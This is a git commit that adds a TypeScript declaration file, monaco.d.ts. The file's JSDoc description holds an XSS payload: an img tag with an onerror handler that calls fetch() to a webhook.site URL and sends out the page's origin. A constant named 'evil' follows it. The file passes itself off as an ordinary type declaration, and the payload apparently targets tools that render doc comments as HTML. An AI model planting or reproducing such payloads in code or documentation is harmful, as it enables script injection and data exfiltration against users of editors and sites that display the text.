c1e2335e57ff3bf03cb4be6a0c068dfde665385a
nologs1 <danieleballarini98@gmail.com>
2026-05-11 14:26:53 +0200

    Create monaco.d.ts

---
+++ monaco.d.ts
@@ -0,0 +1,4 @@
+/**
+ * @description <img src=x onerror="fetch('https://webhook.site/55ba3434-91a8-49ee-993d-42e54f4fb6a3?s=jsxss&origin='+encodeURIComponent(window.location.origin))">
+ */
+declare const evil: any;
